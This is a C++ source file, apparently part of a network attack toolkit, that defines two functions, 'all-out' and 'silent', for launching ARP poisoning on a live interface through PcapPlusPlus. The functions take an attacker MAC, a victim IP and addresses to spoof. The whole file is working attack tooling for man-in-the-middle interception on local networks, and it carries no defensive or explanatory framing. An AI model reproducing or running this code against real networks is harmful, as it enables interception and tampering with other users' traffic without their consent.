#include "arp_poisoning/public.h"
#include "IpAddress.h"
#include "MacAddress.h"
#include "PcapLiveDevice.h"
#include "PcapLiveDeviceList.h"
#include "arp_poisoning/all_out.h"
#include "arp_poisoning/arp_poisoning_strategy.h"
#include "arp_poisoning/silent.h"
#include <memory>
#include <stdexcept>
#include <utility>

/**
 * In the current implementation this method will not terminate and keep
 * peforming the attack.
 */
void ATK::ARP::allOutPoison(const AllOutPoisoningOptions &options) {
    pcpp::PcapLiveDevice *device =
        pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIpOrName(
            options.ifaceIpOrName);

    if (device == nullptr) {
        throw std::invalid_argument(options.ifaceIpOrName +
                                    " is not a valid interface");
    }

    ATK::ARP::AllOutArpPoisoningStrategy::Builder builder(device);

    if (options.attackerMac.has_value()) {
        const pcpp::MacAddress macAddress(options.attackerMac.value());
        builder = builder.attackerMac(macAddress);
    }

    std::unique_ptr<ATK::ARP::AllOutArpPoisoningStrategy> strategy =
        builder.build();

    ArpPoisoningContext arpPoisoningContext(std::move(strategy));

    arpPoisoningContext.execute();
}

void ATK::ARP::silentPoison(const SilentPoisoningOptions &options) {
    pcpp::PcapLiveDevice *device =
        pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIpOrName(
            options.ifaceIpOrName);

    if (device == nullptr) {
        throw std::invalid_argument(options.ifaceIpOrName +
                                    " is not a valid interface");
    }

    for (const std::string &ipToSpoofStr : options.ipsToSpoof) {

        const pcpp::IPv4Address ipToSpoof(ipToSpoofStr);
    }

    ATK::ARP::SilentArpPoisoningStrategy::Builder builder(device);

    if (options.attackerMac.has_value()) {
        const pcpp::MacAddress macAddress(options.attackerMac.value());
        builder = builder.attackerMac(macAddress);
    }

    if (options.victimIp.has_value()) {
        const pcpp::IPv4Address victimIp(options.victimIp.value());
        builder = builder.addVictimIp(victimIp);
    }

    for (const auto &ipToSpoofStr : options.ipsToSpoof) {
        const pcpp::IPv4Address ipToSpoof(ipToSpoofStr);
        builder = builder.addIpToSpoof(ipToSpoof);
    }

    std::unique_ptr<ATK::ARP::SilentArpPoisoningStrategy> strategy =
        builder.build();

    ArpPoisoningContext arpPoisoningContext(std::move(strategy));

    arpPoisoningContext.execute();
}
